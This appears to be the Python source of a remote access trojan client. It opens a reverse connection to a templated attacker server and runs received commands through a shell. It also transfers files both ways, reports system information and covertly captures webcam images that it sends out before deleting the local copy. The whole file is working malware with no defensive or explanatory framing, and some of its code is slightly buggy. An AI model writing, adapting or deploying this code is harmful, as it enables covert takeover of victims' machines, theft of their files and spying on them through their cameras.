import socket
import subprocess
import os
import platform
import cv2


def webcam_snap():
    webcam = cv2.VideoCapture(0)
    check, frame = webcam.read()
    if not os.path.exists("C:\\tmp"):
        os.mkdir("C:\\tmp")
    cv2.imwrite(filename="C:\\tmp\\p.png", img=frame)
    webcam.release()
    send_file("C:\\tmp\\p.png")
    os.remove("C:\\tmp\\p.png")


def send_file(filename):
    try:
        filesize = os.path.getsize(filename)
    except:
        s.send("Path doesn't exist!".encode())
        return
    s.send(str(filesize).encode())
    if s.recv(BUFFER_SIZE).decode() == "ok":
        # start sending the file
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    break
                s.sendall(bytes_read)


def recv_file(path):
    filesize = int(s.recv(BUFFER_SIZE).decode())
    s.send("ok".encode())
    left = filesize
    try:
        f = open(path, "wb")
        while 1:
            rev = s.recv(BUFFER_SIZE)
            f.write(rev)
            left -= len(rev)
            if left == 0:
                break
        f.close()
    except FileNotFoundError:
        s.send("No such file or directory".encode())


def run():
    while True:
        # receive the command from the server
        cmd = s.recv(BUFFER_SIZE).decode()
        if cmd.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        elif cmd[:2] == 'cd':
            if cmd[3] == '~':
                os.chdir(os.environ['HOME'] + (cmd[4:] if len(cmd) > 3 else None))
            else:
                os.chdir(cmd[3:])
            s.send(os.getcwd().encode())
        elif cmd[:7] == "sysinfo":
            s.send(platform.platform().encode() + "\n".encode())
        # File download
        elif cmd[:8] == "download":
            filename = cmd[9:]
            send_file(filename)
        # File upload
        elif cmd[:6] == "upload":
            filename = cmd[7:]
            recv_file(filename)
        # Webcam Snapshot
        elif cmd[:11] == "webcam_snap":
            webcam_snap()
        else:
            p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(p.stdout + "\n".encode() + os.getcwd().encode())
    s.close()


if __name__ == '__main__':
    SERVER_HOST = "$HOST$"
    SERVER_PORT = "$PORT$"
    BUFFER_SIZE = 10240
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))
    s.send(os.getcwd().encode())
    run()